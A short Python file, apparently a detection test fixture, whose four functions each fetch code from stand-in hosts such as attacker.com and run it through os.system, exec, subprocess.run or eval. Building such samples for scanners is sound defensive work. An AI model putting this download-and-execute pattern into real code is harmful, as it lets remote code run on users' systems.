from zipfile import ZipFile

from setuptools import setup, find_packages
import platform, stat, threading, ctypes

# payload:
import requests
import urllib
import urllib.request
from urllib.request import urlopen
import http.client
import socket

# executing:
import os
import subprocess
from fabric import Connection
import sh

def test1():
    '''
    response: requests.get
    execution: os.system
    '''
    url = 'https://attacker.com/payload'
    payload = requests.get(url).text
    os.system(payload)

def test2():
    '''
    response: urllib.request.urlopen
    execution: exec
    '''
    data = urlopen('http://malicious-url.com/some_code.py').read()
    exec(data)

def test3():
    '''
    response: urllib.request.urlopen
    execution: subprocess.run
    '''
    data = urlopen('http://malicious-url.com/some_code.py').read()
    subprocess.run(data, shell=True)

def test4():
    '''
    response: requests.get
    execution: eval
    '''
    url = 'https://attacker.com/payload'
    payload = requests.get(url).text
    eval(payload)
